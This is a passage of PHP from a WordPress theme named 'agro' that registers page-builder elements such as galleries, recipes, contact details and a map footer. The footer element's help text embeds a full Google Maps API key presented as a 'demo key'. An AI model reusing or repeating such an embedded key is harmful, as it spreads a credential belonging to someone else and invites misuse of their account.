                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr0',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'stclr',
                'heading' => esc_html__('Detail subtitle color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'mtclr',
                'heading' => esc_html__('Detail title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr1',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'nclr',
                'heading' => esc_html__('Number color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ntclr',
                'heading' => esc_html__('Number title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* Slider Container
/******************************/
if (!function_exists('agro_product_features_container_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_features_container_integrateWithVC');
    function agro_product_features_container_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Product Features Container', 'agro'),
        'base' => 'agro_product_features_container',
        "as_parent" => array('only' => 'agro_product_features_item'),
        "content_element" => true,
        "show_settings_on_create" => true,
        "is_container" => true,
        "admin_label" => true,
        "js_view" => 'VcColumnView',
        'icon' => 'nt_logo',
        'category'=> 'AGRO',
        'params'   => array(
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

if (class_exists('WPBakeryShortCodesContainer')) {
    class WPBakeryShortCode_Agro_Product_Features_Container extends WPBakeryShortCodesContainer
    {
    }
}
/*******************************/
/* Slider item Style 1
/******************************/
if (!function_exists('agro_product_features_item_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_features_item_integrateWithVC');
    function agro_product_features_item_integrateWithVC()
    {
        vc_map(
            array(
                'name' => esc_html__('Product Features Item', 'agro'),
                'base' => 'agro_product_features_item',
                "as_child" => array('only' => 'agro_product_features_container'),
                "content_element" => true,
                "show_settings_on_create"  => true,
                "admin_label" => true,
                'icon' => 'nt_logo',
                'category' => 'AGRO',
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Product image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Product Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'thintitle',
                        'heading' => esc_html__('Product Thin Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textarea_html',
                        'param_name' => 'content',
                        'heading' => esc_html__('Product Description', 'agro')
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'hidecounter',
                        'heading' => esc_html__('Hide Counter', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the item counter will be disabled.', 'agro'),
                    ),
                    //color
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'product_spacer',
                        'heading' => esc_html__('Product Color Customize', 'agro'),
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'tclr',
                        'heading' => esc_html__('Title color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'thclr',
                        'heading' => esc_html__('Thin title color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'descclr',
                        'heading' => esc_html__('Description color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                        'group' => esc_html__('Color', 'agro')
                    ),
                    //Background CSS
                    array(
                        'type' => 'css_editor',
                        'param_name' => 'css',
                        'heading' => esc_html__('Background CSS', 'agro'),
                        'group' => esc_html__('Background', 'agro')
                    )
                )
            )
        );
    }
    if (class_exists('WPBakeryShortCode')) {
        class WPBakeryShortCode_Agro_Product_Features_Item extends WPBakeryShortCode
        {
        }
    }
}

/*******************************/
/* recipes
/******************************/
if (!function_exists('agro_recipes_integrateWithVC')) {
    add_action('vc_before_init', 'agro_recipes_integrateWithVC');
    function agro_recipes_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Recipes', 'agro'),
        'base' => 'agro_recipes',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Product Preview', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img1',
                        'heading' => esc_html__('First Recipes Image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title1',
                        'heading' => esc_html__('First Recipes Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc1',
                        'heading' => esc_html__('First Recipes Description', 'agro'),
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link1',
                        'heading' => esc_html__('First Recipes Link', 'agro'),
                    ),
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img2',
                        'heading' => esc_html__('Second Recipes image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title2',
                        'heading' => esc_html__('Second Recipes Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc2',
                        'heading' => esc_html__('Second Recipes Description', 'agro'),
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link2',
                        'heading' => esc_html__('Second Recipes Link', 'agro'),
                    )
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Recipes LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'param_name' => 'lg',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Recipes Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Recipes Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Recipes Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thvrclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* gallery 1
/******************************/
if (!function_exists('agro_gallery1_integrateWithVC')) {
    add_action('vc_before_init', 'agro_gallery1_integrateWithVC');
    function agro_gallery1_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Gallery', 'agro'),
        'base' => 'agro_gallery1',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Gallery', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    )
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('XL Column Width', 'agro'),
                'description' => esc_html__('XL : X-Large Device', 'agro'),
                'param_name' => 'xl',
                'edit_field_class' => 'vc_col-sm-4',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-xl-1',
                    esc_html__('2 column', 'agro') => 'col-xl-2',
                    esc_html__('3 column', 'agro') => 'col-xl-3',
                    esc_html__('4 column', 'agro') => 'col-xl-4',
                    esc_html__('5 column', 'agro') => 'col-xl-5',
                    esc_html__('6 column', 'agro') => 'col-xl-6',
                    esc_html__('7 column', 'agro') => 'col-xl-7',
                    esc_html__('8 column', 'agro') => 'col-xl-8',
                    esc_html__('9 column', 'agro') => 'col-xl-9',
                    esc_html__('10 column', 'agro') => 'col-xl-10',
                    esc_html__('11 column', 'agro') => 'col-xl-11',
                    esc_html__('12 column', 'agro') => 'col-xl-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-4',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-md-1',
                    esc_html__('2 column', 'agro') => 'col-md-2',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('SM Column Width', 'agro'),
                'description' => esc_html__('SM : Small Device', 'agro'),
                'param_name' => 'sm',
                'edit_field_class' => 'vc_col-sm-4',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-sm-1',
                    esc_html__('2 column', 'agro') => 'col-sm-2',
                    esc_html__('3 column', 'agro') => 'col-sm-3',
                    esc_html__('4 column', 'agro') => 'col-sm-4',
                    esc_html__('5 column', 'agro') => 'col-sm-5',
                    esc_html__('6 column', 'agro') => 'col-sm-6',
                    esc_html__('7 column', 'agro') => 'col-sm-7',
                    esc_html__('8 column', 'agro') => 'col-sm-8',
                    esc_html__('9 column', 'agro') => 'col-sm-9',
                    esc_html__('10 column', 'agro') => 'col-sm-10',
                    esc_html__('11 column', 'agro') => 'col-sm-11',
                    esc_html__('12 column', 'agro') => 'col-sm-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Gallery Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'overlay',
                'heading' => esc_html__('Overlay color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* gallery 2
/******************************/
if (!function_exists('agro_gallery2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_gallery2_integrateWithVC');
    function agro_gallery2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Gallery 2', 'agro'),
        'base' => 'agro_gallery2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Gallery Style', 'agro'),
                'param_name' => 'style',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Style 1', 'agro') => '1',
                    esc_html__('Style 2', 'agro') => '2',
                )
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Gallery', 'agro'),
                'params' => array(
                    array(
                        'type' => 'textfield',
                        'param_name' => 'filtertitle',
                        'heading' => esc_html__('Category Filter Title', 'agro'),
                    ),
                    array(
                        'type' => 'param_group',
                        'param_name' => 'loop2',
                        'heading' => esc_html__('Category Gallery', 'agro'),
                        'params' => array(
                            array(
                                'type' => 'checkbox',
                                'param_name' => 'h2y',
                                'heading' => esc_html__('Height Image 2Y?', 'agro'),
                                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                                'description' => esc_html__('If checked, the height image will be 2Y.', 'agro'),
                                'edit_field_class' => 'vc_col-sm-6 pt15',
                            ),
                            array(
                                'type' => 'attach_image',
                                'param_name' => 'img',
                                'heading' => esc_html__('Item Image', 'agro'),
                                'edit_field_class' => 'vc_col-sm-6',
                            ),
                            array(
                                'type' => 'textfield',
                                'param_name' => 'title',
                                'heading' => esc_html__('Item Iitle', 'agro'),
                                'edit_field_class' => 'vc_col-sm-6'
                            ),
                            array(
                                'type' => 'textfield',
                                'param_name' => 'desc',
                                'heading' => esc_html__('Item Small Description', 'agro'),
                                'edit_field_class' => 'vc_col-sm-6'
                            )
                        )
                    )
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Filter Alignment', 'agro'),
                'param_name' => 'align',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Center', 'agro') => 'text-center',
                    esc_html__('Left', 'agro') => 'text-left',
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'alltitle',
                'heading' => esc_html__('Filter All Category Title', 'agro'),
                'value' => esc_html__('All', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Column', 'agro'),
                'param_name' => 'column',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('2 column', 'agro') => '6',
                    esc_html__('3 column', 'agro') => '4',
                    esc_html__('4 column', 'agro') => '3',
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Gallery Filter Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'fclr',
                'heading' => esc_html__('Filter color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'factclr',
                'heading' => esc_html__('Hover and active filter color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Gallery Item Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'overlay',
                'heading' => esc_html__('Overlay color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'catclr',
                'heading' => esc_html__('Short detail color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* contact details
/******************************/
if (!function_exists('agro_contact_details_integrateWithVC')) {
    add_action('vc_before_init', 'agro_contact_details_integrateWithVC');
    function agro_contact_details_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Contact Details', 'agro'),
        'base' => 'agro_contact_details',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Contact Details', 'agro'),
                'group' => esc_html__('Contact', 'agro'),
                'params' => array(
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Icon Type', 'agro'),
                        'description' => esc_html__('Select icon type', 'agro'),
                        'param_name' => 'icontype',
                        'std' => 'df',
                        'value' => array(
                            esc_html__('Default Icon Class', 'agro') => 'df',
                            esc_html__('Select Box', 'agro') => 'sb',
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'icon',
                        'heading' => esc_html__('Item Icon Name', 'agro'),
                        'dependency' => array(
                            'element' => 'icontype',
                            'value' => 'df','',
                        )
                    ),
                    array(
                        'type' => 'iconpicker',
                        'param_name' => 'icons',
                        'heading' => esc_html__('Item Icon Name', 'agro'),
                        'dependency' => array(
                            'element' => 'icontype',
                            'value' => 'sb',
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Item Detail', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'param_name' => 'lg',
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Contact', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Contact', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-md-1',
                    esc_html__('2 column', 'agro') => 'col-md-2',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'contact_spacer',
                'heading' => esc_html__('Contact Item Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'iconclr',
                'heading' => esc_html__('Icon color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Detail color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}



/*******************************/
/* footer3
/******************************/
if (!function_exists('agro_footer3_integrateWithVC')) {
    add_action('vc_before_init', 'agro_footer3_integrateWithVC');
    function agro_footer3_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Footer Style 3', 'agro'),
        'base' => 'agro_footer3',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(

            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Custom Footer Html Area', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'useiframe',
                'heading' => esc_html__('Use custom iframe map?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'iframemap',
                'heading' => esc_html__('Add iframe src here', 'agro'),
                'description' => sprintf(esc_html__('Visit %s to create your map (Step by step: 1) Find location 2) Click the cog symbol in the lower right corner and select "Share or embed map" 3) On modal window select "Embed map" 4) Copy iframe src code and paste it).', 'agro'),'<a href="https://www.google.com/maps" target="_blank">Google maps</a>'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'markerimg',
                'heading' => esc_html__('Map Marker Image', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'apikey',
                'heading' => esc_html__('Api Key', 'agro'),
                'description' => esc_html__('This is demo key e.g: AIzaSyBXQROV5YMCERGIIuwxrmaZbBl_Wm4Dy5U', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'longitude',
                'heading' => esc_html__('Longitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo longitude e.g: 44.958309', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'latitude',
                'heading' => esc_html__('Latitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo latitude e.g: 34.109925', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'minh',
                'heading' => esc_html__('Min Map Height', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* Advantages
/******************************/
if (!function_exists('agro_advantages_integrateWithVC')) {
    add_action('vc_before_init', 'agro_advantages_integrateWithVC');
    function agro_advantages_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Advantages', 'agro'),
        'base' => 'agro_advantages',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Features', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'imgw',
                        'heading' => esc_html__('Image width', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'imgh',
                        'heading' => esc_html__('Image height', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro'),
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Short description', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    )
                )
            ),
            // fonts
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}
/*******************************/
/* Advantages
/******************************/
if (!function_exists('agro_advantages_integrateWithVC')) {
    add_action('vc_before_init', 'agro_advantages_integrateWithVC');
    function agro_advantages_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Advantages', 'agro'),
        'base' => 'agro_advantages',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Features', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'imgw',
                        'heading' => esc_html__('Image width', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'imgh',
                        'heading' => esc_html__('Image height', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro'),
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Short description', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    )
                )
            ),
            // fonts
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dclr',
